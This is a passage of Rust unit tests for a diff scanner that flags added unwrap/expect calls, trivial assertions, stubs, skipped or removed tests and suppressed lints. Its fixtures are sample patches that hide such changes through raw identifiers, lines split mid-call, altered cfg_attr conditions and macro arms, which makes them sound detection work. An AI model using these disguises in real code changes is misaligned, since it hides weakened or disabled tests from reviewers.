            (&["+    it.map(Result::unwrap);"], &[S::PanicPathAdded]),
        ];
        for (lines, expected) in one_line {
            assert_eq!(inside(lines), *expected, "{lines:?}");
        }
        // outside a macro's body the answer is the same
        assert_eq!(
            found(&hunk_of(
                "tests/x.rs",
                &["+fn a() {", "+    assert!", "+    (true);", "+}"]
            ))
            .iter()
            .map(|item| (item.0, item.1))
            .collect::<Vec<_>>(),
            [(S::TrivialAssert, Basis::Hunk)]
        );
    }

    /// Third independent review, IR3-M-2: the arm of a `macro_rules!` definition. The parser
    /// marked what it could not read inside a macro's invocation, and an arm of a definition
    /// is another kind of node: a construct split over lines there left neither an item nor a
    /// mark. Each of these compiled and ran (a panic; a test that passes; a test that does
    /// not run). The review's files, whole.
    #[test]
    fn a_construct_in_the_arm_of_a_macro_definition_is_read() {
        let arms: &[(&[&str], EvidenceSignal, u32)] = &[
            (
                &[
                    "macro_rules! get {",
                    "    ($x:expr) => {",
                    "        $x.unwrap",
                    "        ()",
                    "    };",
                    "}",
                    "pub fn production(v: Option<u32>) -> u32 {",
                    "    get!(v)",
                    "}",
                ],
                S::PanicPathAdded,
                3,
            ),
            (
                &[
                    "macro_rules! check {",
                    "    ($x:expr) => {",
                    "        assert!(",
                    "            true",
                    "        );",
                    "    };",
                    "}",
                    "#[test]",
                    "fn t() {",
                    "    check!(compute());",
                    "}",
                ],
                S::TrivialAssert,
                3,
            ),
            (
                &[
                    "macro_rules! later {",
                    "    () => {",
                    "        todo",
                    "        !()",
                    "    };",
                    "}",
                    "pub fn production() -> u32 {",
                    "    later!()",
                    "}",
                ],
                S::StubAdded,
                3,
            ),
            (
                &[
                    "macro_rules! skipped {",
                    "    ($name:ident) => {",
                    "        #[test]",
                    "        #[",
                    "          ignore]",
                    "        fn $name() { assert_eq!(compute(), 4); }",
                    "    };",
                    "}",
                    "skipped!(checks);",
                ],
                S::TestSkipped,
                4,
            ),
            (
                &[
                    "macro_rules! get {",
                    "    ($x:expr) => {",
                    "        Option::",
                    "        unwrap($x)",
                    "    };",
                    "}",
                    "pub fn production(v: Option<u32>) -> u32 {",
                    "    get!(v)",
                    "}",
                ],
                S::PanicPathAdded,
                3,
            ),
            // the review's control: the same two lines inside `vec![…]`
            (
                &[
                    "pub fn production(v: Option<u32>) -> u32 {",
                    "    vec![v.unwrap",
                    "        ()][0]",
                    "}",
                ],
                S::PanicPathAdded,
                2,
            ),
        ];
        for (body, signal, line) in arms {
            assert_eq!(
                found(&new_file("src/mr.rs", body)),
                [(*signal, Basis::Hunk, *line)],
                "{body:?}"
            );
        }
    }

    /// Independent review, IR-M-3: a conditional skip whose condition changed is another skip.
    /// The test ran everywhere but under Miri and now runs nowhere. The construct is the list
    /// from its `#` to its `ignore`, so a token added anywhere in the condition is a token of
    /// it on an added line.
    #[test]
    fn a_conditional_skip_whose_condition_changed_is_evidence() {
        let changed = found(&hunk_of(
            "tests/slow.rs",
            &[
                " #[test]",
                " #[cfg_attr(",
                "-    miri,",
                "+    all(),",
                "     ignore",
                " )]",
                " fn slow() {",
            ],
        ));
        assert_eq!(changed, [(S::TestSkipped, Basis::Hunk, 4)]);
        // Second independent review, IR2-M-1: the comparison went by the attribute's words,
        // which leave out what is nested in a list and what is a string. Each of these changes
        // the condition under which the test is skipped, and each was "the same attribute".
        // The last two only respace the line: once they were told apart from a change, by
        // comparing the old attribute's text; nothing is compared with the old side now, a
        // line written again inside the condition is a change to it, and they are reported.
        // It errs toward evidence.
        for (before, after) in [
            ("all(miri),", "all(),"),
            ("not(any()),", "not(miri),"),
            ("target_os = \"plan9\",", "target_os = \"linux\","),
            ("feature = \"never-enabled\",", "feature = \"default\","),
            ("any(miri),", "any(miri, unix, windows),"),
            ("all(miri),", "all( miri ) ,"),
            ("all(miri),", "    all(miri),"),
        ] {
            let (removed, added) = (format!("-    {before}"), format!("+    {after}"));
            let condition = found(&hunk_of(
                "tests/slow.rs",
                &[
                    " #[test]",
                    " #[cfg_attr(",
                    &removed,
                    &added,
                    "     ignore",
                    " )]",
                    " fn slow() {",
                ],
            ));
            assert_eq!(
                condition,
                [(S::TestSkipped, Basis::Hunk, 4)],
                "{before} to {after}"
            );
        }
        // A line added beside the attribute and not in it: no evidence.
        let beside = found(&hunk_of(
            "tests/slow.rs",
            &[
                " #[test]",
                " #[cfg_attr(",
                "     all(miri),",
                "     ignore",
                " )]",
                "+#[inline]",
                " fn slow() {",
            ],
        ));
        assert_eq!(beside, []);
        // Only the reason changed: the `ignore` is on the line that was written again.
        let reason = found(&hunk_of(
            "tests/slow.rs",
            &[
                " #[test]",
                " #[cfg_attr(",
                "     miri,",
                "-    ignore = \"slow\"",
                "+    ignore = \"very slow\"",
                " )]",
                " fn slow() {",
            ],
        ));
        assert_eq!(reason, [(S::TestSkipped, Basis::Hunk, 5)]);
    }

    /// Third independent review, IR3-M-1. The parser compared an attribute's text with its
    /// whitespace removed, and a newline is not free: moving one changes what is comment and
    /// what is code. Two of the review's three patches add a token to the condition and are
    /// found. The first is declared a miss, and so is its control: the change takes
    /// `feature = "ci",` out of the condition (the test went from failing to ignored, compiled
    /// and run) and the only added line is a comment, so no token of the skip is on an added
    /// line. A change that only removes tokens is not read (see the module's limits).
    #[test]
    fn a_conditional_skip_whose_condition_only_lost_tokens_is_not_read() {
        let at = |body: &[&str]| found(&hunk_of("src/at.rs", body));
        // `at1.patch`: declared miss (the parser: nothing either)
        assert_eq!(
            at(&[
                " #[test]",
                " #[cfg_attr(",
                "     all(",
                "-        // heavy: only on CI",
                "-        feature = \"ci\",",
                "+        // heavy: only on CI feature = \"ci\",",
                "         target_os = \"linux\",",
                "     ),",
                "     ignore",
                " )]",
                " fn checks_the_ledger() {",
            ]),
            []
        );
        // `at1ctl.patch`: declared miss (the parser: `test_skipped`)
        assert_eq!(
            at(&[
                " #[test]",
                " #[cfg_attr(",
                "     all(",
                "-        // heavy: only on CI",
                "-        feature = \"ci\",",
                "+        // heavy: only on CI",
                "         target_os = \"linux\",",
                "     ),",
                "     ignore",
                " )]",
                " fn checks_the_ledger() {",
            ]),
            []
        );
        // `at2.patch` and `at3.patch`: found (the parser: nothing)
        assert_eq!(
            at(&[
                " #[test]",
                " #[cfg_attr(",
                "-    // x",
                "-    all(miri), // all(),",
                "+    // x all(miri), //",
                "+    all(),",
                "     ignore)]",
                " fn checks_the_ledger() {",
            ]),
            [(S::TestSkipped, Basis::Hunk, 5)]
        );
        assert_eq!(
            at(&[
                " #[test]",
                " #[cfg_attr(",
                "-    target_os = \"lin ux\",",
                "+    target_os = \"linux\",",
                "     ignore)]",
                " fn checks_the_ledger() {",
            ]),
            [(S::TestSkipped, Basis::Hunk, 4)]
        );
        // Third independent review, IR3-L-3 (`un1.patch`), the same limit: a call on an
        // unchanged line that the change brings to life, by removing the comment around it.
        assert_eq!(
            at(&[
                " pub fn production(x: Option<u32>) -> u32 {",
                "-    /* disabled until the cache is fixed",
                "+    // enabled again",
                "     let v = x.unwrap();",
                "-    */",
                "-    let v = x.unwrap_or(0);",
                "     v",
                " }",
            ]),
            []
        );
    }

    /// Found 2026-11-14 while the rule was taught nested lists; the cost was older. Each
    /// `cfg_attr` list of a line was read from its own start, so lists opened inside one
    /// another cost the square of the line: 80,000 of `#[cfg_attr(` (880 KB) took 32 s to
    /// rank. The lists are followed as the tokens pass, sixteen of them at once at most, and
    /// one opened past that is taken to hold a skip.
    #[test]
    fn the_cfg_attr_lists_of_a_hunk_are_followed_in_one_pass() {
        // the flood in a patch: one item, on its line
        for count in [50_000, 200_000] {
            let flood = format!("+{}", "#[cfg_attr(".repeat(count));
            assert_eq!(
                within_deadline(move || found(&hunk_of("tests/a.rs", &[&flood]))),
                [(S::TestSkipped, Basis::Lexical, 2)],
                "{count}"
            );
        }
        // up to the limit the answer is exact: a nest that applies nothing, lists side by
        // side, and one skip at the end of them
        let nest = format!("+{}", "#[cfg_attr(".repeat(16));
        assert_eq!(found(&hunk_of("tests/a.rs", &[&nest])), []);
        let beside = "#[cfg_attr(a, inline)] ".repeat(10_000);
        assert_eq!(found(&hunk_of("tests/a.rs", &[&format!("+{beside}")])), []);
        assert_eq!(
            found(&hunk_of(
                "tests/a.rs",
                &[&format!("+{beside}#[cfg_attr(a, ignore)]")]
            )),
            [(S::TestSkipped, Basis::Lexical, 2)]
        );
        // the same flood a line each: the lists span lines and are still one pass
        let lines = vec!["+#[cfg_attr("; 100_000];
        assert_eq!(
            within_deadline(move || found(&hunk_of("tests/a.rs", &lines)).len()),
            100_000 - 16
        );
    }

    /// Independent review, IR-L-2 and IR-L-3: an `ignore` that belongs to another attribute is
    /// no skipped test; a function passed by name is a panic path; and `allow` is read
    /// whatever its spacing. (The arguments of a `cfg_attr`, case by case, are in the token
    /// reader's own tests.)
    #[test]
    fn nested_ignore_passed_functions_and_spaced_allow() {
        // each case also on a line of 70 KB: no size changes the answer (a hunk that large
        // was not parsed, and said `syntax_unchecked`)
        let pad = "a".repeat(70_000);
        let serde = "#[cfg_attr(feature = \"serde\", serde(skip, ignore, default))]";
        assert_eq!(
            found(&hunk_of("src/a.rs", &[&format!("+{serde}"), "+struct A;"])),
            []
        );
        assert_eq!(
            found(&hunk_of("src/a.rs", &[&format!("+{serde} // {pad}")])),
            []
        );
        for (arguments, skips) in [
            ("miri, ignore)]", true),
            ("miri, ignore = \"slow\")]", true),
            ("all(a, b), allow(x), ignore)]", true),
            ("miri, ignore", true),
            ("ignore, allow(x))]", false),
            ("miri, allow(ignore))]", false),
            ("feature = \"serde\", serde(skip, ignore, default))]", false),
            ("miri, ignored)]", false),
            ("miri)]", false),
            // second independent review, IR2-M-2: a `cfg_attr` that a `cfg_attr` applies is
            // followed
            ("all(), cfg_attr(all(), ignore))]", true),
            ("all(), cfg_attr ( all() , ignore = \"slow\" ) )]", true),
            ("a, allow(x), cfg_attr(b, inline, ignore))]", true),
            ("a, cfg_attr(b, cfg_attr(c, ignore)))]", true),
            ("a, cfg_attr(b, cfg_attr(c, inline)), ignore)]", true),
            ("a, cfg_attr(b, ignore", true),
            // and only that: the nested condition, the place of the condition, another
            // attribute's list, a longer name, and what follows a nested list that has closed
            ("all(), cfg_attr(ignore, allow(x)))]", false),
            ("cfg_attr(a, ignore), allow(x))]", false),
            ("a, serde(cfg_attr(b, ignore)))]", false),
            ("a, my_cfg_attr(b, ignore))]", false),
            ("a, cfg_attr(b, inline) ignore)]", false),
            (
                "a, cfg_attr(b, cfg_attr(c, inline)))] fn ignore() {}",
                false,
            ),
            ("miri, ignore)] fn a() {}", true),
            ("miri)] fn a() {}", false),
        ] {
            let expected: &[(EvidenceSignal, Basis, u32)] = if skips {
                &[(S::TestSkipped, Basis::Lexical, 2)]
            } else {
                &[]
            };
            let line = format!("+#[cfg_attr({arguments}");
            assert_eq!(found(&hunk_of("tests/a.rs", &[&line])), expected, "{line}");
        }
        // no recursion: a line that nests as deep as it is long
        let deep = format!("+#[cfg_attr(a, {}ignore", "cfg_attr(a, ".repeat(200_000));
        assert_eq!(
            within_deadline(move || found(&hunk_of("tests/a.rs", &[&deep]))),
            [(S::TestSkipped, Basis::Lexical, 2)]
        );
        let deep = format!(
            "+#[cfg_attr(a, {}inline{}]",
            "cfg_attr(a, ".repeat(200_000),
            ")".repeat(200_001)
        );
        assert_eq!(
            within_deadline(move || found(&hunk_of("tests/a.rs", &[&deep]))),
            []
        );
        for line in [
            "+    it.map(Result::unwrap)",
            "+    it.map(Option::expect)",
            "+    let c = <Option<u32>>::unwrap(x);",
            "+    let d = Result::<u32, E>::unwrap(r);",
            "+    let e = Wrapper :: expect (x, \"one\");",
        ] {
            let item = [(S::PanicPathAdded, Basis::Lexical, 2)];
            assert_eq!(found(&hunk_of("src/a.rs", &[line])), item, "{line}");
            assert_eq!(
                found(&hunk_of("src/a.rs", &[&format!("{line} // {pad}")])),
                item,
                "{line}"
            );
        }
        assert_eq!(
            found(&hunk_of(
                "src/a.rs",
                &["+    it.map(Result::unwrap_or_default)"]
            )),
            []
        );
        for line in [
            "+#![allow(unused)]",
            "+#! [allow(unused)]",
            "+# [allow(unused)]",
            "+#[allow(dead_code)]",
        ] {
            assert_eq!(
                found(&hunk_of("src/a.rs", &[line]))
                    .iter()
                    .map(|item| item.0)
                    .collect::<Vec<_>>(),
                [S::CheckSuppressed],
                "{line}"
            );
        }
    }

    /// Review V3 round 8, VD3R8-M-1: `r#unwrap` is the identifier `unwrap` to the compiler
    /// (checked there with rustc), and `x.r#unwrap()` and `X::r#unwrap(x)` left neither an item
    /// nor a mark. A raw identifier is read as the identifier it is: the code view the tokens
    /// are cut from has its prefix blank.
    #[test]
    fn a_raw_identifier_is_read_as_the_identifier_it_is() {
        let pad = "a".repeat(70_000);
        let cases: &[(&str, EvidenceSignal)] = &[
            ("pub fn f(x: X) { x.r#unwrap(); }", S::PanicPathAdded),
            ("pub fn g(x: X) { X::r#unwrap(x); }", S::PanicPathAdded),
            ("pub fn h(x: X) { x.r#expect(\"one\"); }", S::PanicPathAdded),
            ("pub fn i(x: X) { x . r#unwrap (); }", S::PanicPathAdded),
            (
                "pub fn j(it: I) { it.map(Result::r#unwrap); }",
                S::PanicPathAdded,
            ),
            (
                "pub fn k(it: I) { it.map(r#Option :: r#expect); }",
                S::PanicPathAdded,
            ),
            ("fn l() { r#assert!(true); }", S::TrivialAssert),
            ("fn m() { r#todo!(); }", S::StubAdded),
            ("fn n() { r#unimplemented!(); }", S::StubAdded),
            ("#[r#ignore]", S::TestSkipped),
            ("#[r#cfg_attr(miri, r#ignore)]", S::TestSkipped),
            ("#[r#allow(dead_code)]", S::CheckSuppressed),
        ];
        for (line, signal) in cases {
            let read: Vec<EvidenceSignal> = found(&hunk_of("tests/r.rs", &[&format!("+{line}")]))
                .iter()
                .map(|item| item.0)
                .collect();
            assert_eq!(read, [*signal], "{line}");
            // and on a line of 70 KB, which the parser did not read
            let long: Vec<EvidenceSignal> =
                found(&hunk_of("tests/r.rs", &[&format!("+{line} // {pad}")]))
                    .iter()
                    .map(|item| item.0)
                    .collect();
            assert_eq!(long, [*signal], "{line}");
        }
        // not raw identifiers: the opener of a raw string; and a longer name is another name
        for line in [
            "+let a = r#\"x.unwrap()\"#;",
            "+let b = br#\"todo!()\"#;",
            "+let d = x.r#unwrap_or(1);",
            "+let e = it.map(Result::r#unwrap_or_default);",
        ] {
            assert_eq!(found(&hunk_of("src/r.rs", &[line])), [], "{line}");
        }
        assert_eq!(without_raw_prefixes("x.unwrap()"), None);
        assert_eq!(
            without_raw_prefixes("x.r#unwrap(r#\"s\"#, r#fn)").as_deref(),
            Some("x.  unwrap(r#\"s\"#,   fn)")
        );
    }

    /// Review V3 round 9, VD3R9-M-1. A function named by a path is a panic path like the
    /// method call it is: `X::unwrap(x)`, `<Option<u32>>::expect(x, "…")`, and the standard
    /// one passed as a value, `it.map(Result::unwrap)`. A rule that read one line found these
    /// only on one line, so a path broken after its `::` (which compiles to the same call)
    /// left nothing; with the raw spelling `r#unwrap` this was Vesper's file. The tokens of a
    /// hunk are read across its lines, and the item is on the first added line that holds a
    /// token of the call: the line of the dot or of the `::` here, where the parser said the
    /// line of the name.
    #[test]
    fn a_path_call_and_a_path_value_are_panic_paths_over_any_number_of_lines() {
        let vesper = new_file(
            "src/raw.rs",
            &[
                "pub struct X;",
                "impl X { pub fn unwrap(self) {} }",
                "pub fn method(x: X) {",
                "    x.",
                "        r#unwrap();",
                "}",
                "pub fn path(x: X) {",
                "    X::",
                "        r#unwrap(x);",
                "}",
                "pub fn passed(it: impl Iterator<Item = X>) {",
                "    let _ = it.map(X::",
                "        r#unwrap);",
                "}",
                "pub fn standard(it: impl Iterator<Item = Result<u8, ()>>) {",
                "    let _ = it.map(Result::",
                "        r#unwrap);",
                "}",
            ],
        );
        // The method call, the call by a path and the standard function as a value. Declared:
        // the third of the four, `X::unwrap` of the patch's own type passed as a value (lines
        // 12 and 13), is not read. The parser named it (and any path used as a value, a
        // constant named `expect` among them); nothing in the tokens tells such a value from
        // an import, a type or a longer path.
        assert_eq!(
            found(&vesper),
            [
                (S::PanicPathAdded, Basis::Hunk, 4),
                (S::PanicPathAdded, Basis::Hunk, 8),
                (S::PanicPathAdded, Basis::Hunk, 16),
            ]
        );
        let cases: &[(&[&str], &[Item])] = &[
            (
                &["+    let v = X::unwrap(x);"],
                &[(S::PanicPathAdded, Basis::Lexical, 2)],
            ),
            (
                &["+    let v = X::", "+        unwrap(x);"],
                &[(S::PanicPathAdded, Basis::Hunk, 2)],
            ),
            (
                &[
                    "+    let v = <Option<u32>>::",
                    "+        expect(x, \"one\");",
                ],
                &[(S::PanicPathAdded, Basis::Hunk, 2)],
            ),
            (
                &["+    let v = Result::<u32, E>::", "+        unwrap(r);"],
                &[(S::PanicPathAdded, Basis::Hunk, 2)],
            ),
            (
                &["+    let v = a::b::", "+        unwrap::<u8>(x);"],
                &[(S::PanicPathAdded, Basis::Hunk, 2)],
            ),
            // passed as a value: the standard one over two lines, and with generic arguments
            // (second independent review, IR2-M-2: no evidence)
            (
                &["+    let v = it.map(Option::", "+        expect);"],
                &[(S::PanicPathAdded, Basis::Hunk, 2)],
            ),
            (
                &["+    let f = Option::<u32>::unwrap;"],
                &[(S::PanicPathAdded, Basis::Lexical, 2)],
            ),
            // declared, as above: a type of the patch's own, passed as a value
            (&["+    let v = it.map(X::unwrap);"], &[]),
        ];
        for (body, expected) in cases {
            assert_eq!(found(&hunk_of("src/p.rs", body)), *expected, "{body:?}");
        }
        // not panic paths: an import, a longer name, a path that only leads on, a macro of
        // that name, a type, a definition
        for body in [
            &["+use a::expect;", "+use b::{c, unwrap};"][..],
            &["+    let v = X::unwrap_or(x, 1);"][..],
            &["+    let v = a::unwrap::b(x);"][..],
            &["+    X::unwrap!(x);"][..],
            &["+fn f(a: a::unwrap) {}"][..],
            &["+impl X { fn unwrap(self) {} }"][..],
        ] {
            assert_eq!(found(&hunk_of("src/p.rs", body)), [], "{body:?}");
        }
        // Inside another macro's body the answers are the same answers. (The parser named
        // nothing there: the path over two lines was `syntax_unchecked`, and so was the
        // value.)
        let inside = |lines: &[&str]| {
            let mut body = vec![" // ctx", "+outer! {"];
            body.extend_from_slice(lines);
            body.extend_from_slice(&["+}", " // ctx"]);
            found(&hunk_of("src/x.rs", &body))
                .iter()
                .map(|item| (item.0, item.1))
                .collect::<Vec<_>>()
        };
        assert_eq!(
            inside(&["+    let v = X::unwrap(x);"]),
            [(S::PanicPathAdded, Basis::Lexical)]
        );
        assert_eq!(
            inside(&["+    let v = X::", "+        unwrap(x);"]),
            [(S::PanicPathAdded, Basis::Hunk)]
        );
        assert_eq!(inside(&["+    let v = it.map(X::unwrap);"]), []);
    }

    /// Review V3 round 9, VD3R9-M-1: a removed `#[r#test]` is a removed test. The rule was
    /// three exact tokens, and the code view blanks a raw prefix to two spaces, so
    /// `#[  test]` matched none of them. Third independent review, IR3-L-4: with arguments
    /// (`#[tokio::test(flavor = "multi_thread")]`) or over lines it was not read either. The
    /// attribute is read from the tokens of the old side.
    #[test]
    fn a_removed_test_attribute_is_read_whatever_its_spelling() {
        for line in [
            "#[test]",
            "#[r#test]",
            "# [ test ]",
            "#[tokio::test]",
            "#[r#tokio::r#test]",
            "#[ tokio :: test ]",
            "#[rstest]",
            "#[r#rstest]",
            "    #[test] // was slow",
            // IR3-L-4
            "#[tokio::test(flavor = \"multi_thread\")]",
            "#[rstest(a, b)]",
            // A `#` straight after a name. This one was not read, the line rule wanting no
            // name before the `#`; up to edition 2018 `x#[test]` is the tokens `x`, `#`, `[`,
            // `test`, `]` to the compiler, and a macro can drop the name (from edition 2021 it
            // is an error).
            "let a = x#[test];",
        ] {
            let found: Vec<(EvidenceSignal, Side, u32)> =
                file_evidence(&removed("tests/x.rs", &[line, "fn t() {}"]))
                    .iter()
                    .map(|e| (e.signal, e.side, e.line))
                    .collect();
            assert_eq!(found, [(S::TestRemoved, Side::Old, 2)], "{line}");
            // adding one is not evidence of anything
            assert_eq!(signals(&added("tests/x.rs", &[line])), [], "{line}");
        }
        for line in [
            "#[testing]",
            "#[test_case(1)]",
            "#[cfg(test)]",
            "#![test]",
            "// #[test]",
            "let s = \"#[test]\";",
        ] {
            assert_eq!(signals(&removed("tests/x.rs", &[line])), [], "{line}");
        }
        // Vesper's second file
        let file = parse(
            "diff --git a/tests/raw_removed.rs b/tests/raw_removed.rs\n--- a/tests/raw_removed.rs\n+++ b/tests/raw_removed.rs\n@@ -1,3 +1,2 @@\n-#[r#test]\n fn check() {}\n fn stays() {}\n",
        )
        .unwrap()
        .remove(0);
        let items: Vec<(EvidenceSignal, Side, u32)> = file_evidence(&file)
            .iter()
            .map(|e| (e.signal, e.side, e.line))
            .collect();
        assert_eq!(items, [(S::TestRemoved, Side::Old, 1)]);
        // the third review's two patches (`tr1.patch`, `tr2.patch`): each gave nothing
        for body in [
            &[
                "-#[tokio::test(flavor = \"multi_thread\")]",
                "-async fn checks_the_ledger() {",
                "-    assert_eq!(ledger_total().await, 4);",
                "-}",
                "+// removed",
            ][..],
            &[
                "-#[",
                "-  test",
                "-]",
                "-fn checks_the_ledger() {",
                "-    assert_eq!(ledger_total(), 4);",
                "-}",
                "+// removed",
            ][..],
        ] {
            let items: Vec<(EvidenceSignal, Side, u32)> =
                file_evidence(&hunk_of("src/tr.rs", body))
                    .iter()
                    .map(|e| (e.signal, e.side, e.line))
                    .collect();
            assert_eq!(items, [(S::TestRemoved, Side::Old, 2)], "{body:?}");
        }
    }

    /// Second independent review, IR2-M-2: the rows of its table. Each compiles and behaves
    /// as its plain spelling does, and each left neither an item nor `syntax_unchecked`. All
    /// seven are items. The seventh was declared a miss until 2026-11-14 (review round 12):
    /// after `/* /* */ // */` the code view took the rest of the line for a comment, where
    /// the compiler nests block comments. The view now reads Rust as the compiler's lexer
    /// does, in plain code and inside another macro's body (the corpus expects both).
    #[test]
    fn the_rows_of_the_second_reviews_table() {
        let rows: &[(&[&str], &[Item])] = &[
            (
                &["+    let v = x.r#unwrap();"],
                &[(S::PanicPathAdded, Basis::Lexical, 11)],
            ),
            (
                &["+    let v = x.r#expect(\"set\");"],
                &[(S::PanicPathAdded, Basis::Lexical, 11)],
            ),
            (
                &["+    let v = it.map(Option::r#unwrap);"],
                &[(S::PanicPathAdded, Basis::Lexical, 11)],
            ),
            (
                &["+    #[r#ignore]", "+    fn t() {}"],
                &[(S::TestSkipped, Basis::Lexical, 11)],
            ),
            (
                &["+    let f = Option::<u32>::unwrap;"],
                &[(S::PanicPathAdded, Basis::Lexical, 11)],
            ),
            (
                &[
                    "+    #[cfg_attr(all(), cfg_attr(all(), ignore))]",
                    "+    fn t() {}",
                ],
                &[(S::TestSkipped, Basis::Lexical, 11)],
            ),
            // after a nested comment (declared a miss until the code view nested them)
            (
                &["+    /* /* */ // */ let v = Result::unwrap(x);"],
                &[(S::PanicPathAdded, Basis::Lexical, 11)],
            ),
        ];
        for (lines, expected) in rows {
            // the review's shape: a hunk at line 10 of an existing file, a comment line
            // before and after
            let mut text = format!(
                "--- a/src/x.rs\n+++ b/src/x.rs\n@@ -10,2 +10,{} @@\n // ctx\n",
                lines.len() + 2
            );
            for line in *lines {
                text.push_str(line);
                text.push('\n');
            }
            text.push_str(" // ctx\n");
            let file = parse(&text).unwrap().remove(0);
            assert_eq!(found(&file), *expected, "{lines:?}");
        }
        // the nested conditional skip on a line of 70 KB: the same answer
        let pad = "a".repeat(70_000);
        assert_eq!(
            found(&hunk_of(
                "tests/a.rs",
                &[&format!(
                    "+#[cfg_attr(all(), cfg_attr(all(), ignore))] // {pad}"
                )]
            )),
            [(S::TestSkipped, Basis::Lexical, 2)]
        );
        for line in [
            "+#[cfg_attr(all(), cfg_attr(ignore, allow(x)))]",
            "+#[cfg_attr(all(), serde(cfg_attr(all(), ignore)))]",
        ] {
            assert_eq!(
                found(&hunk_of("tests/a.rs", &[line, "+struct A;"])),
                [],
                "{line}"
            );
            assert_eq!(
                found(&hunk_of("tests/a.rs", &[&format!("{line} // {pad}")])),
                [],
                "{line}"
            );
        }
    }

    /// Review V3 round 4, VD3R4-M-1, and round 5, VD3R5-M-1: inside another macro's body the
    /// parser named no construct, and a rule that read one line could not follow an assertion
    /// over three. There was nothing, then a mark that it was not checked. Read as tokens it
    /// is the assertion it is, on its first line.
    #[test]
    fn a_construct_inside_a_macro_body_over_several_lines_is_read() {
        let forwarded = found(&new_file(
            "tests/m.rs",
            &[
                "macro_rules! outer {",
                "    ($($tt:tt)*) => { $($tt)* };",
                "}",
                "outer! {",
                "    assert!(",
                "        true",
                "    );",
                "}",
            ],
        ));
        assert_eq!(forwarded, [(S::TrivialAssert, Basis::Hunk, 5)]);
        // VD3R5-M-1: the outer macro on the same row is not the assertion. (Before: the mark,
        // on the line of the unread word.)
        let cases: &[(&[&str], &[Item])] = &[
            (
                &["outer! { assert!(", "    true", "); }"],
                &[(S::TrivialAssert, Basis::Hunk, 1)],
            ),
            (
                &[
                    "outer! { #[cfg_attr(",
                    "    miri,",
                    "    ignore",
                    ")] fn a() {} }",
                ],
                &[(S::TestSkipped, Basis::Hunk, 1)],
            ),
            (
                &["a!(); outer! { std::assert!(", "    true", "); }"],
                &[(S::TrivialAssert, Basis::Hunk, 1)],
            ),
            (
                &[
                    "outer! {",
                    "    #[cfg_attr(",
                    "        miri,",
                    "        ignore",
                    "    )]",
                    "    #[test]",
                    "    fn a() {}",
                    "}",
                ],
                &[(S::TestSkipped, Basis::Hunk, 2)],
            ),
            (
                &["outer! {", "    assert!(true);", "}"],
                &[(S::TrivialAssert, Basis::Lexical, 2)],
            ),
            (
                &["fn a() {", "    assert!(", "        true", "    );", "}"],
                &[(S::TrivialAssert, Basis::Hunk, 2)],
            ),
            // not trivial, inside a macro's body or outside, and not an assertion at all
            (
                &["fn a() {", "    assert!(", "        b()", "    );", "}"],
                &[],
            ),
            (
                &["outer! {", "    my_assert!(", "        true", "    );", "}"],
                &[],
            ),
            // (before: `syntax_unchecked`, since no rule could read it to its end)
            (
                &[
                    "outer! {",
                    "    assert!(b(), \"{}\", c(",
                    "        d",
                    "    ));",
                    "}",
                ],
                &[],
            ),
        ];
        for (body, expected) in cases {
            assert_eq!(found(&new_file("tests/m.rs", body)), *expected, "{body:?}");
        }
    }

    /// In a new file a panic path stands whatever attribute is above it. (These were the
    /// cases that fell short of the proof of test code, while there was one.)
    #[test]
    fn a_panic_path_in_a_new_file_stands_whatever_attribute_is_above_it() {
        let stands: &[(&[&str], u32)] = &[
            (&["#[test]", "fn a() {", "    f().unwrap();", "}"], 3),
            (
                &[
                    "#[tokio::test]",
                    "async fn a() {",
                    "    f().await.expect(\"x\");",
                    "}",
                ],
                3,
            ),
            // Vesper's reproductions: an attribute imported under a test framework's name, a
            // dependency renamed to a test framework's, and the same done to `test` itself
            (
                &[
                    "use tracing::instrument as rstest;",
                    "#[rstest]",
                    "pub fn production() {",
                    "    load().unwrap();",
                    "}",
                ],
                4,
            ),
            (
                &[
                    "use some_macros::passthrough as test;",
                    "#[test]",
                    "pub fn production() {",
                    "    load().unwrap();",
                    "}",
                ],
                4,
            ),
            // an attribute macro before the cfg, or around the item, may drop the cfg
            (
                &[
                    "#[strip]",
                    "#[cfg(test)]",
                    "pub fn production() {",
                    "    load().unwrap();",
                    "}",
                ],
                4,
            ),
            (
                &[
                    "#[strip]",
                    "mod outer {",
                    "    #[cfg(test)]",
                    "    pub fn production() {",
                    "        load().unwrap();",
                    "    }",
                    "}",
                ],
                5,
            ),
            // the function after the one under `cfg(test)` is not under it
            (
                &[
                    "#[cfg(test)]",
                    "fn helper() {}",
                    "fn real() {",
                    "    f().unwrap();",
                    "}",
                ],
                4,
            ),
        ];
        for (body, line) in stands {
            assert_eq!(
                found(&new_file("src/a.rs", body)),
                [(S::PanicPathAdded, Basis::Lexical, *line)],
                "{body:?}"
            );
        }
    }

    /// A hunk from the middle of a file proves nothing, whatever it shows: above it a comment
    /// can be open that ends on the attribute's own line, and then this function is in the
    /// program. Its panic path stands.
    #[test]
    fn a_hunk_from_the_middle_of_a_file_keeps_its_panic_path() {
        let middle = parse(
            "--- a/src/a.rs\n+++ b/src/a.rs\n@@ -40,4 +40,5 @@\n  notes\n #[cfg(test)] // */\n pub fn production() {\n+    load().unwrap();\n }\n",
        )
        .unwrap()
        .remove(0);
        assert_eq!(found(&middle), [(S::PanicPathAdded, Basis::Lexical, 43)]);
        for body in [
            &[
                " #[cfg(test)]",
                " mod checks {",
                "+    fn helper() { f().unwrap(); }",
                " }",
            ][..],
            &[
                "+#[cfg(test)]",
                "+fn helper() {",
                "+    f().unwrap();",
                "+}",
            ][..],
        ] {
            let items = found(&hunk_of("src/a.rs", body));
            assert_eq!(
                items.iter().map(|i| (i.0, i.1)).collect::<Vec<_>>(),
                [(S::PanicPathAdded, Basis::Lexical)],
                "{body:?}"
            );
        }
        let unseen = found(&hunk_of("tests/a.rs", &["+    f().unwrap();"]));
        assert_eq!(unseen, [(S::PanicPathAdded, Basis::Lexical, 2)]);
    }

    /// A panic path is read wherever it stands, in a hunk of any size, and only where it is a
    /// call: a longer name, a comment, a string, a bare name and a removed line are none.
    #[test]
    fn a_panic_path_is_read_wherever_it_stands_and_only_as_a_call() {
        // inside a macro's body
        assert_eq!(
            found(&hunk_of("src/a.rs", &["+    outer! { x.unwrap(); }"])),
            [(S::PanicPathAdded, Basis::Lexical, 2)]
        );
        // on a line of 70 KB (the parser did not read such a hunk, and it said so with a
        // second item, `syntax_unchecked`)
        let long = format!("+    f().unwrap(); // {}", "a".repeat(70_000));
        assert_eq!(
            found(&hunk_of("src/a.rs", &[long.as_str()])),
            [(S::PanicPathAdded, Basis::Lexical, 2)]
        );
        // after a line of 64 KiB of `}`
